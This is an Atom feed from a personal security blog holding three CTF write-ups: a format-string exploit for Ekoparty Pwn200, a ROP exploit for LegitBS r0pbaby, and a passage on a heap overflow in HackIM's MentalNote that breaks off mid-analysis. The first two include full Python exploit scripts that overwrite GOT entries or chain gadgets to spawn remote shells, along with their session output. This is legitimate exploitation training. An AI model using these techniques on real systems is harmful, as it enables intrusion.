<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Binary | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/binary/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-09-22T00:08:41+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Ekoparty - Pwn200]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200/"/>
    <updated>2015-09-21T23:47:44+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/21/ekoparty-pwn200</id>
    <content type="html"><![CDATA[<p>Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:</p>

<!--more-->


<pre><code>$ nc challs.ctf.site 20002
&lt;Simple loop greetings v1.3.3.7&gt;
[!] Type bye to quit
Enter your name: %17$s
Hi 3k0_p4rty_2015!
</code></pre>

<p>However this wasn&rsquo;t the flag. As we&rsquo;ll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:</p>

<p>bAAAA%8$x</p>

<pre><code>nc challs.ctf.site 20002
&lt;Simple loop greetings v1.3.3.7&gt;
[!] Type bye to quit
Enter your name: bAAAA%8$x
Hi bAAAA41414141
</code></pre>

<p>From the raw dump, we reconstructed parts of the binary. We came across a string that said &ldquo;OMG! Well done, here&rsquo;s your flag&rdquo; or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:</p>

<pre><code>bas@tritonal:~$ rasm2 -d -o 0x13370861 -
7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
disassemble error at offset 162
jnz 0x1337087a
mov dword [esp+0x4], 0x13370a97
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x133704e0
test eax, eax
jz 0x13370892
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370a9a ; 
call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
jmp dword 0x3d613337
mov dword [esp], 0x13370aa2 ; Hi
call dword 0x13370510
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x13370510
mov dword [esp], 0x13370aa6
call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
or al, 0xd8
std
invalid
</code></pre>

<p>Since our input can never be larger than 12 bytes, we can never win the strcmp with <code>Welcome to ekoparty 2015</code>. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn&rsquo;t really write anything, anywhere:</p>

<p><code>A\xde\xad\xbe\xef%255c%8$hn</code> was 15 chars&hellip; So we set out to make a write() function using the format string vuln.</p>

<p>On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they&rsquo;re usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here&rsquo;s how:</p>

<p>$25 contains the address of $61. Let&rsquo;s assume $25 contains 0xfffff080.</p>

<p>$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn&rsquo;t work out but bear with me).</p>

<p>$124 contains nothing of interest, and isn&rsquo;t used by the binary.</p>

<p>If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we&rsquo;ve written out an address in $124, we can use the format string to write to that location.</p>

<p>Let&rsquo;s assume we want to write 0x41414141 to 0x804b020. We first do this:</p>

<pre><code>%32c%61$hhn (write 0x20 to 0xfffff1a0). 
</code></pre>

<p>Then, we update the pointer at $61 by writing to $25:</p>

<pre><code>%161c%25$hhn
</code></pre>

<p>So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:</p>

<pre><code>%176c%61$hhn (write 0xb0 to 0xfffff1a1). 
</code></pre>

<p>Etc until we have 0x804b020 at $124. Then we write using $124:</p>

<pre><code>%65c%124$hhn
</code></pre>

<p>And we&rsquo;ll have written the first byte to 0x804b020. We repeat this process for the other bytes&hellip;</p>

<p>With our new and shiny write() function we set out to break this challenge. We first tried truncating the string &ldquo;Welcome to ekoparty 2015!&rdquo; in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn&rsquo;t work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:</p>

<pre><code>mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -&gt; 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
</code></pre>

<p>We dumped and reversed the function at <code>0x133720cc</code>, which apparently decodes the flag. However, we where only able to get the pieces <code>EKO{</code> and <code>b4by</code>. The dump process wasn&rsquo;t perfect, so we continued.</p>

<p>So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does <code>xor eax, eax; ret</code>. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the <code>xor eax, eax</code> gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:</p>

<pre><code>movzx ecx, byte [eax+0x5]
movzx eax, byte [edx+0x5]
sub eax, ecx
ret
</code></pre>

<p>In two steps, we overwrote strcmp (we can&rsquo;t have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget&hellip; and we got something like this:</p>

<pre><code>OMG! nice work, your flag is: EKO{
</code></pre>

<p>And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken&hellip; Which indeed it turned out to be, later on.</p>

<p>Next, loads of failed attempts later, we stumbled upon <a href="https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">this writeup of another challenge</a> that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It <a href="https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7">traverses the link_map</a> found in memory to grab <code>system()</code>.</p>

<p>This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).</p>

<p>At the start of the got, we find these bytes:</p>

<pre><code>0x13371f14 ; .dynamic
0xb7fff938 ; *link_map
0xb7ff24f0 ; *dl-resolve
</code></pre>

<p>We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:</p>

<pre><code class="c">struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;          /* Base address shared object is loaded at.  */
    char *l_name;               /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;            /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };
</code></pre>

<p>So at 0xb7fff938 we find:
<code>
0x746e450a ; base_addr.. not correct due to printf
0xb7fffc24 ; name! empty
0x13371f14 ; the bin itself... not useful.
0xb7fffc28 ; ptr-&gt;next
</code></p>

<p>This is the binary. On to the next one at 0xb7fffc28, which was linux-gate&hellip; Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:</p>

<pre><code>[+] Opening connection to challs.ctf.site on port 20002: Done
0xb7e2dec8 0x0
0xb7e2ded8 0x1da8
1768709983 __li
0x0
0xb7e2dee8 0xbde
1819570783 _rtl
0x0
0xb7e2def8 0x45d1
1768709983 __li
0x0
0xb7e2df08 0x13f4
...
0xb7e2f948 0x3176
signal
0xb7e2f9a8 0xeab
puts
0xb7e30208 0xa3e
&lt;empty&gt;

0xb7e30588 0x3063
__libc_system
Enter your name:
[!] found system!0x3fcd0 0xb7e69cd0
</code></pre>

<p>We had the address of system! Now, the plan of attack was as follows:</p>

<ul>
<li>write <code>/bin/sh</code> to 0x13373008, which gets used in a free() call</li>
<li>overwrite free@got with system</li>
<li>set strcmp to the <code>xor eax, eax; ret</code> gadget</li>
<li>receive shell</li>
</ul>


<p>This <em>almost</em> worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!</p>

<p>The poc we used:</p>

<pre><code class="python">import socket, struct, telnetlib, time
from pwn import *

context(arch='i386', os='linux')
def p(x):
        return struct.pack('&lt;I', x)

def read1(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    if (address &amp; 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")

    data = conn.recv(200)
    if data[4:7] == 'Ent':
        return 0
    return ord(data[3:4])

def read4(address):
    value = 0
    for i in range(4):
        #value &lt;&lt;= 8
        value += read1(address+i) &lt;&lt; (8*i)

    return value


def leak(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    if (address &amp; 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address &gt;&gt; 24) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")
    data = conn.recv(200)
    return data[3:]

def write1(what, where):
#       argument 25 contains 0xbffff844,
#                               which points to 0xbffff958
#       so we can use 25 to modify position 61 to write something on the stack!
#       addr = 0xbffff758 # = argument 2
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(where &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((where &gt;&gt; 8) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((where &gt;&gt; 16) &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((where) &gt;&gt; 24 &amp; 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    # write byte
    if ord(what) &lt; 100:
        conn.send("%"+str(ord(what))+"c%124$hhn")
    else:
        conn.send("%"+str(ord(what))+"c%124$hn")
    conn.recv(300)

def writebytes(what, where):
    for i in range(len(what)):
        write1(what[i], where+i)

global conn
conn = remote('challs.ctf.site', 20002)
conn.recv(200)

print "[+] writing /bin/sh to 0x13373008"
writebytes('/bin/sh', 0x13373008)

print "[+] writing system() to 0x13372020"
writebytes(struct.pack('I', 0xb7e69cd0), 0x13372020)

print "[+] fucking up strcmp()"
writebytes("\x1f", 0x13372011)

conn.interactive()
</code></pre>

<p>Yeah. Pretty horrible.</p>

<pre><code>bas@tritonal:~/bin/ekoparty-ctf/pwn20$ python pwnpoc.py 
[+] Opening connection to challs.ctf.site on port 20002: Done
[+] writing /bin/sh to 0x13373008
[+] writing system() to 0x13372020
[+] fucking up strcmp()
[*] Switching to interactive mode
$ id
$ id
uid=1001(simple) gid=1001(simple) groups=1001(simple)
$ cd /home/simple
$ ls -al
total 68
drwxr-x--- 2 simple simple  4096 Sep 17 13:45 .
drwxr-xr-x 6 root   root    4096 Sep 12 21:10 ..
-rw------- 1 simple simple   145 Sep 12 21:13 .bash_history
-rw-r--r-- 1 simple simple   220 Oct  7  2014 .bash_logout
-rw-r--r-- 1 simple simple  3637 Oct  7  2014 .bashrc
-rw-r--r-- 1 simple simple   675 Oct  7  2014 .profile
-rwxr-xr-x 1 root   root   27095 Nov 17  2011 checksec.sh
-rw-r--r-- 1 simple simple    35 Sep 14 23:37 flag
-rw-r----- 1 root   simple  1904 Aug 27 01:08 fmt_001.c
-rwxr-x--- 1 root   simple  5776 Aug 27 01:08 greetings
Hi id

OMG! nice work, your flag is: ^\x10LnBye!
[*] Got EOF while reading in interactive
$  
</code></pre>

<p>After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag&hellip; someone planted it there (thanks! but no thanks). So we grabbed the C source file:</p>

<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include  &lt;signal.h&gt;

char *mkey;
unsigned char mkey_crypt[] = { "\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf" };  
unsigned char fmt[] = { "\x71\x73\x27\x1f\x1d\x48\x47" };
unsigned char flag[] = { "\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b" };

char *decrypt(const char *msg, const char *key)
{
    int len_key = strlen(key);
    int len_msg = strlen(msg);
    int i, j;
    char *out = (char *)malloc(len_key + 1);
    if (!out)
    {
        printf("WTF no memory :s");
        return NULL;
    }
    for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
    {
        out[i] = msg[i] ^ (i + key[i%len_key]);
    }
    return out;
}

void handler(int num)
{
    puts("Bye!");
    exit(-1);
}

void process()
{
    char buff[13];
    puts("&lt;Simple loop greetings v1.3.3.7&gt;");
    puts("[!] Type bye to quit");
    while (1)
    {
        alarm(10);
        printf("Enter your name: ");
        fflush(stdout);
        memset(buff, 0, sizeof(buff));
        read(0, buff, sizeof(buff) - 1);
        if (strstr(buff, "bye"))
        {
            puts("Bye!");
            break;
        }
        if (strstr(buff, "%n") || strstr(buff, "%N"))
        {
            //p: %s\n", buff);
            break;
        }
        printf("Hi ");printf(buff);puts("");
        if (!strcmp("Welcome to ekoparty 2015!", buff))
        {
            printf("OMG! nice work, your flag is: ");
            char *fmt_ = decrypt(fmt, mkey);
            char *flag_ = decrypt(flag, mkey);
            printf(fmt_, flag_);
            free(fmt_);
            free(flag_);
            break;
        }
    }
}

//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings
int main(int argc, char **argv)
{
    signal(SIGALRM, handler);
    mkey = decrypt(mkey_crypt, "3k0_p4rty_2015!");
    process();
    free(mkey);
}
</code></pre>

<p>Spot the mistake!</p>

<p>Found it? Yeah:</p>

<pre><code>for (i = 0; i &lt; len_msg &amp;&amp; i &lt; sizeof(len_msg); i++)
</code></pre>

<p>Thanks. Anyway, we reimplemented this file in Python (honestly couldn&rsquo;t get the C program to run without segfaulting, bleh).</p>

<pre><code class="python">def decrypt(msg, key):
    out = ""

    for i in range(len(msg)):
        out += chr(ord(msg[i]) ^ (ord(key[i % len(key)]) + i))

    return out


mkey = decrypt("\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf", "3k0_p4rty_2015!")

print decrypt("\x71\x73\x27\x1f\x1d\x48\x47", mkey)
print decrypt("\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b", mkey)
</code></pre>

<p>Which <em>finally</em> gave us the flag:</p>

<pre><code>EKO{\%s}
b4by_3xpl0it_FMT_str1ng_FTW!#$
</code></pre>

<p>The flag was <code>EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}</code>. Too bad the challenge was broken, nice to learn a new technique!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
    <updated>2015-05-29T23:07:23+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>

<!--more-->


<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>

<pre><code class="bash">bas@tritonal:~/tmp/ropbaby$ file r0pbaby
r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : disabled
</code></pre>

<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>

<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>

<pre><code class="python">import socket, struct, re, time

def p(x):
    return struct.pack('&lt;Q', x)

def get_function(s, name):
    s.send('2\n')
    s.send(name+'\n')
    time.sleep(0.50)
    data = s.recv(1000)

    m = re.findall('(0x0000.*)', data)
    print m
    return int(m[0], 16)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('localhost', 4000))
s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))

print s.recv(1000)
print s.recv(1000)

# get some address where we'll store the shellcode
SYSTEM = get_function(s, "system")
READ = get_function(s, "read")
MPROTECT = get_function(s, "mprotect")

# this offset was found like so:
# $ nm -D ./libc-2.19.so |grep mprotect
# 00000000000f4a20 W mprotect
LIBC_BASE = MPROTECT - 0xf4a20

print "[!] libc_base  = 0x%X" % LIBC_BASE
print "[!] system()   = 0x%X" % SYSTEM
print "[!] read()     = 0x%X" % READ
print "[!] mprotect() = 0x%X" % MPROTECT

POPRDX = LIBC_BASE + 0x000bcee0
POPRAX = LIBC_BASE + 0x00048858
POPRSI = LIBC_BASE + 0x00024805
POPRDI = LIBC_BASE + 0x00022b1a
SYSCAL = LIBC_BASE + 0x000c1e55
MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret

# kick off ROP chain
s.send('3\n')
print s.recv(1000)


# build ROP chain
# first, mprotect() a certain area
payload = "A"*8
payload += p(POPRDX)
payload += p(7)
payload += p(POPRSI)
payload += p(0x1000)
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(POPRAX)
payload += p(10)
payload += p(SYSCAL)

# secondly, write '/bin' to memory via MOVMEM gadget
payload += p(POPRDX)
payload += p(0x6e69622f)
payload += p(POPRAX)
payload += p(LIBC_BASE)
payload += p(MOVMEM)

# thirdly, write '//sh' to memory
payload += p(POPRDX)
payload += p(0x68732f2f)
payload += p(POPRAX)
payload += p(LIBC_BASE+4)
payload += p(MOVMEM)

# finally, return-to-system and invoke a shell
payload += p(POPRDI)
payload += p(LIBC_BASE)
payload += p(SYSTEM)

length = "%d" % (len(payload)+1)
print "[!] sending " + length + " bytes"
s.send(length + '\n')

time.sleep(0.5)
s.send(payload + '\n')

print s.recv(1000)

# interact with the shell
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
</code></pre>

<p>Putting it all together:</p>

<p><img src="/assets/legitbs/r0pbaby.png" alt="" /></p>

<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - MentalNote]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote/"/>
    <updated>2015-01-11T21:40:18+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mentalnote</id>
    <content type="html"><![CDATA[<p><code>mentalnote</code> was a 400 point exploitation-type challenge in NullCon&rsquo;s HackIM CTF.</p>

<!-- more -->


<p></p>

<p>Again, superkojiman started with the invaluable initial reverse engineering. The application is a note-taking program:</p>

<pre><code>~/tmp/nullcon/exp400$ ./MentalNote 
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
</code></pre>

<p>superkojiman pointed out that there were two types of notes. Upon adding a note, the program asks for the type. It looks like the second type is larger. By editing a note as type two, we are able to overflow notes into the next note&rsquo;s meta-data.</p>

<p>First, let&rsquo;s allocate two notes and set them to something to inspect the heap layout.</p>

<pre><code>You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAA
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
1
Give the type to edit:
2
Give your Note:
BBBB
Please enter one of the following option:
</code></pre>

<p>I located the second note in the heap using gdb-peda&rsquo;s <code>find</code> command.</p>

<pre><code>gdb-peda$ x/60w 0x804d0c0
0x804d0c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804d0f0:  0x000000e1  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>You can see that there are several pointers stored on the heap. It looks like a doubly-linked list, with pointers to the next and previous notes. The struct that describes this layout would look something like this:</p>

<pre><code class="c">struct note {
    note *next_note;
    note *prev_note;
    char note_content[MAX_LENGTH];
};
</code></pre>

<p>I sent a stupidly large input to overflow these notes:</p>

<pre><code>gdb-peda$ r
You want to store some Notes??
Well, we present you the Sherlock's MentalPad --&gt;
Sherlock uses Mental Notes to solve the Cases -- Now you can use it too.
NOTE: It has a limit though
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
1
Give the type of the Note:
1
Please enter one of the following option:
1 to add a Note.
2 to delete a Note.
3 to edit a Note.
4 to show a Note.
5 to exit.
Your Choice:
3
Give the Note id to edit:
0
Give the type to edit:
2
Give your Note:
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRAAAABBBB
</code></pre>

<p>The heap for note two now looks like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x46464646  0x47474747  0x48484848  0x49494949
0x804d0d0:  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c  0x4d4d4d4d
0x804d0e0:  0x4e4e4e4e  0x4f4f4f4f  0x50505050  0x51515151
0x804d0f0:  0x52525252  0x41414141  0x42424242  0x4242420a
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
</code></pre>

<p>We have overwritten the pointers. Furthermore, superkojiman noticed:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
&lt;snip&gt;
0x0804c000 0x0804e000 rwxp  [heap]
</code></pre>

<p>The heap is writeable <strong>and</strong> executable. This allows us to store shellcode on the heap. Now to find a way to get the heap address reliably (ASLR is enabled) and overwrite a GOT pointer with the location of our shellcode.</p>

<p>I recently tested c0ne&rsquo;s binaries for his Pandora&rsquo;s Box VM. I did one of the challenges in a similar way: overflow a buffer up to a certain pointer to grab extra bytes when that buffer is printed. I could leak the heap address by sending just enough bytes into note one to make the heap look like this:</p>

<pre><code>gdb-peda$ x/60wx 0x804d0c0
0x804d0c0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0d0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0e0:  0x42424242  0x42424242  0x42424242  0x42424242
0x804d0f0:  0x4242420a  0x0804d1d0  0x0804d010  0x42424242
0x804d100:  0x0000000a  0x00000000  0x00000000  0x00000000
0x804d110:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

